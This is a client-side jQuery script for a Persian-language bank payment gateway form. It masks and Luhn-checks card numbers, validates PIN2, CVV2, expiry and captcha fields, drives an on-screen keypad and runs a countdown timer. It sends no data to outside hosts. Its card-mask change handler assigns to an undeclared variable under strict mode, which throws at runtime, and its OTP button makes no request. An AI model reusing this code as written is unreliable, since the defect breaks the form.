(function ($) {
  "use strict";

  function digitsOnly(value) {
    return String(value || "")
      .replace(/[۰-۹]/g, function (ch) {
        return String("۰۱۲۳۴۵۶۷۸۹".indexOf(ch));
      })
      .replace(/[٠-٩]/g, function (ch) {
        return String("٠١٢٣٤٥٦٧٨٩".indexOf(ch));
      })
      .replace(/\D/g, "");
  }

  function pad2(value) {
    return digitsOnly(value).slice(0, 2);
  }

  function luhnValid(number) {
    var sum = 0;
    var alternate = false;
    var i;
    var n;
    for (i = number.length - 1; i >= 0; i -= 1) {
      n = parseInt(number.charAt(i), 10);
      if (alternate) {
        n *= 2;
        if (n > 9) {
          n -= 9;
        }
      }
      sum += n;
      alternate = !alternate;
    }
    return sum % 10 === 0;
  }

  function cardDigits(input) {
    if (!input || !$(input).data("mask")) {
      return digitsOnly(input ? input.value : "");
    }
    return digitsOnly($(input).cleanVal());
  }

  function setCardDigits(input, digits) {
    $(input).val(digitsOnly(digits).slice(0, 16)).trigger("input");
  }

  var form = document.getElementById("ipg-form");
  if (!form || !$) {
    return;
  }

  var $form = $(form);
  var cardInput = document.getElementById("card_number");
  var pinInput = document.getElementById("pin2");
  var cvvInput = document.getElementById("cvv2");
  var monthInput = document.getElementById("expiry_month");
  var yearInput = document.getElementById("expiry_year");
  var captchaInput = document.getElementById("captcha");
  var captchaImg = document.getElementById("captcha-image");
  var refreshBtn = document.getElementById("captcha-refresh");
  var timerEl = document.getElementById("ipg-timer-value");
  var keypad = document.getElementById("ipg-keypad");
  var remaining = parseInt(form.getAttribute("data-remaining") || "0", 10);
  var otpBtn = document.getElementById("pin2-otp");
  var otpMsg = document.getElementById("pin2-otp-msg");
  var otpTimerId = null;
  var jumps = {
    card: false,
    month: false,
    year: false,
    captcha: false,
  };

  var numericFields = [cardInput, pinInput, cvvInput, monthInput, yearInput, captchaInput].filter(Boolean);
  var active = cardInput || pinInput;

  numericFields.forEach(function (field) {
    field.addEventListener("focus", function () {
      active = field;
    });
  });

  function markField(element, isValid) {
    var $el = $(element);
    if (!$el.val() && isValid) {
      $el.removeClass("ipg-input-valid ipg-input-invalid");
      return;
    }
    $el.toggleClass("ipg-input-valid", Boolean(isValid && $el.val()));
    $el.toggleClass("ipg-input-invalid", !isValid);
  }

  function validateField(element) {
    if (!element || !$form.data("validator")) {
      return;
    }
    $(element).valid();
  }

  function focusField(field) {
    if (!field) {
      return;
    }
    window.setTimeout(function () {
      active = field;
      field.focus();
    }, 0);
  }

  function tryJump(key, complete, next) {
    if (!complete) {
      jumps[key] = false;
      return;
    }
    if (jumps[key] || !next) {
      return;
    }
    jumps[key] = true;
    focusField(next);
  }

  function focusNextAfterCard() {
    tryJump("card", Boolean(cardInput && cardDigits(cardInput).length === 16), cvvInput);
  }

  function focusNextAfterMonth() {
    var digits = digitsOnly(monthInput ? monthInput.value : "");
    var month = parseInt(digits, 10);
    tryJump("month", digits.length === 2 && month >= 1 && month <= 12, yearInput);
  }

  function focusNextAfterYear() {
    tryJump("year", digitsOnly(yearInput ? yearInput.value : "").length === 2, captchaInput);
  }

  function focusNextAfterCaptcha() {
    tryJump("captcha", digitsOnly(captchaInput ? captchaInput.value : "").length === 5, pinInput);
  }

  if (cardInput && $.fn.mask) {
    $(cardInput).mask("0000-0000-0000-0000", {
      translation: {
        0: { pattern: /[0-9۰-۹٠-٩]/ },
      },
      onComplete: function () {
        validateField(cardInput);
        focusNextAfterCard();
      },
      onChange: function () {
        if (cardDigits(cardInput).length < 16) {
          cardJumpDone = false;
        }
        validateField(cardInput);
      },
    });
  }

  if ($.validator) {
    $.validator.addMethod(
      "cardNumber16",
      function (value, element) {
        var digits = digitsOnly(value);
        if (this.optional(element) && digits.length === 0) {
          return true;
        }
        return digits.length === 16 && luhnValid(digits);
      },
      "شماره کارت نامعتبر است."
    );

    $.validator.addMethod(
      "pin2Digits",
      function (value, element) {
        var len = digitsOnly(value).length;
        if (this.optional(element) && len === 0) {
          return true;
        }
        return len >= 5 && len <= 12;
      },
      "رمز اینترنتی باید بین ۵ تا ۱۲ رقم باشد."
    );

    $.validator.addMethod(
      "cvv2Digits",
      function (value, element) {
        var len = digitsOnly(value).length;
        if (this.optional(element) && len === 0) {
          return true;
        }
        return len >= 3 && len <= 4;
      },
      "کد CVV2 نامعتبر است."
    );

    $.validator.addMethod(
      "expiryMonth",
      function (value, element) {
        var month = parseInt(digitsOnly(value), 10);
        if (this.optional(element) && digitsOnly(value).length === 0) {
          return true;
        }
        return month >= 1 && month <= 12;
      },
      "ماه انقضا نامعتبر است."
    );

    $.validator.addMethod(
      "expiryYear",
      function (value, element) {
        var year = digitsOnly(value);
        if (this.optional(element) && year.length === 0) {
          return true;
        }
        return year.length === 2;
      },
      "سال انقضا نامعتبر است."
    );

    $.validator.addMethod(
      "captchaDigits",
      function (value, element) {
        var code = digitsOnly(value);
        if (this.optional(element) && code.length === 0) {
          return true;
        }
        return code.length === 5;
      },
      "کد امنیتی باید ۵ رقم باشد."
    );

    $form.validate({
      errorClass: "ipg-field-error-msg",
      validClass: "ipg-field-ok",
      errorElement: "span",
      errorPlacement: function (error, element) {
        element.closest(".ipg-control").append(error);
      },
      highlight: function (element) {
        markField(element, false);
      },
      unhighlight: function (element) {
        markField(element, true);
      },
      onkeyup: function (element, event) {
        if (event.which === 9 && this.elementValue(element) === "") {
          return;
        }
        this.element(element);
        if (element === cardInput) {
          focusNextAfterCard();
        }
        if (element === monthInput) {
          focusNextAfterMonth();
        }
        if (element === yearInput) {
          focusNextAfterYear();
        }
        if (element === captchaInput) {
          focusNextAfterCaptcha();
        }
      },
      onfocusout: function (element) {
        this.element(element);
      },
      rules: {
        card_number: { required: true, cardNumber16: true },
        pin2: { required: true, pin2Digits: true },
        cvv2: { required: true, cvv2Digits: true },
        expiry_month: { required: true, expiryMonth: true },
        expiry_year: { required: true, expiryYear: true },
        captcha: { required: true, captchaDigits: true },
        email: { required: false, email: true },
      },
      messages: {
        card_number: {
          required: "شماره کارت را وارد کنید.",
        },
        pin2: {
          required: "رمز اینترنتی را وارد کنید.",
        },
        cvv2: {
          required: "کد CVV2 را وارد کنید.",
        },
        expiry_month: {
          required: "ماه انقضا را وارد کنید.",
        },
        expiry_year: {
          required: "سال انقضا را وارد کنید.",
        },
        captcha: {
          required: "کد امنیتی را وارد کنید.",
        },
        email: {
          email: "ایمیل نامعتبر است.",
        },
      },
    });
  }

  function bindDigits(input, maxLength) {
    if (!input) {
      return;
    }
    input.addEventListener("input", function () {
      input.value = digitsOnly(input.value).slice(0, maxLength);
      validateField(input);
    });
  }

  bindDigits(pinInput, 12);
  bindDigits(cvvInput, 4);

  if (captchaInput) {
    captchaInput.addEventListener("input", function () {
      captchaInput.value = digitsOnly(captchaInput.value).slice(0, 5);
      validateField(captchaInput);
      focusNextAfterCaptcha();
    });
  }

  if (monthInput) {
    monthInput.addEventListener("input", function () {
      monthInput.value = pad2(monthInput.value);
      validateField(monthInput);
      focusNextAfterMonth();
    });
  }

  if (yearInput) {
    yearInput.addEventListener("input", function () {
      yearInput.value = pad2(yearInput.value);
      validateField(yearInput);
      focusNextAfterYear();
    });
  }

  var emailInput = document.getElementById("email");
  if (emailInput) {
    emailInput.addEventListener("input", function () {
      validateField(emailInput);
    });
  }

  function insertDigit(digit) {
    if (!active) {
      return;
    }
    if (active === cardInput) {
      setCardDigits(cardInput, cardDigits(cardInput) + digit);
      validateField(cardInput);
      focusNextAfterCard();
      return;
    }
    if (active === pinInput) {
      pinInput.value = digitsOnly(pinInput.value + digit).slice(0, 12);
      validateField(pinInput);
      return;
    }
    if (active === cvvInput) {
      cvvInput.value = digitsOnly(cvvInput.value + digit).slice(0, 4);
      validateField(cvvInput);
      return;
    }
    if (active === monthInput) {
      monthInput.value = pad2(monthInput.value + digit);
      validateField(monthInput);
      focusNextAfterMonth();
      return;
    }
    if (active === yearInput) {
      yearInput.value = pad2(yearInput.value + digit);
      validateField(yearInput);
      focusNextAfterYear();
      return;
    }
    if (active === captchaInput) {
      captchaInput.value = digitsOnly(captchaInput.value + digit).slice(0, 5);
      validateField(captchaInput);
      focusNextAfterCaptcha();
    }
  }

  function backspace() {
    if (!active) {
      return;
    }
    if (active === cardInput) {
      setCardDigits(cardInput, cardDigits(cardInput).slice(0, -1));
      jumps.card = false;
      validateField(cardInput);
      return;
    }
    active.value = String(active.value || "").slice(0, -1);
    validateField(active);
    if (active === monthInput) {
      focusNextAfterMonth();
    }
    if (active === yearInput) {
      focusNextAfterYear();
    }
    if (active === captchaInput) {
      focusNextAfterCaptcha();
    }
  }

  if (keypad) {
    keypad.addEventListener("click", function (event) {
      var btn = event.target.closest("[data-key]");
      if (!btn) {
        return;
      }
      var key = btn.getAttribute("data-key");
      if (key === "back") {
        backspace();
        return;
      }
      insertDigit(key);
      if (active) {
        active.focus();
      }
    });
  }

  if (refreshBtn && captchaImg) {
    refreshBtn.addEventListener("click", function () {
      captchaImg.src = "/pay/captcha?t=" + Date.now();
      if (captchaInput) {
        captchaInput.value = "";
        $(captchaInput).removeClass("ipg-input-valid ipg-input-invalid");
        captchaInput.focus();
      }
    });
  }

  function toFaDigits(value) {
    return String(value).replace(/\d/g, function (d) {
      return "۰۱۲۳۴۵۶۷۸۹"[d];
    });
  }

  function formatTime(seconds) {
    var m = Math.floor(Math.max(0, seconds) / 60);
    var s = Math.max(0, seconds) % 60;
    return toFaDigits(String(m).padStart(2, "0") + ":" + String(s).padStart(2, "0"));
  }

  function tick() {
    if (!timerEl) {
      return;
    }
    timerEl.textContent = formatTime(remaining);
    if (remaining <= 0) {
      window.location.href = "/pay/failed?reason=timeout";
      return;
    }
    remaining -= 1;
    window.setTimeout(tick, 1000);
  }

  tick();

  if (otpBtn) {
    var otpLabel = otpBtn.textContent;

    otpBtn.addEventListener("click", function () {
      if (otpBtn.disabled) {
        return;
      }

      if (otpMsg) {
        otpMsg.hidden = false;
      }

      var secondsLeft = 120;
      otpBtn.disabled = true;
      otpBtn.textContent = formatTime(secondsLeft);

      if (otpTimerId) {
        window.clearInterval(otpTimerId);
      }

      otpTimerId = window.setInterval(function () {
        secondsLeft -= 1;
        if (secondsLeft <= 0) {
          window.clearInterval(otpTimerId);
          otpTimerId = null;
          otpBtn.disabled = false;
          otpBtn.textContent = otpLabel;
          if (otpMsg) {
            otpMsg.hidden = true;
          }
          return;
        }
        otpBtn.textContent = formatTime(secondsLeft);
      }, 1000);
    });
  }
})(window.jQuery);
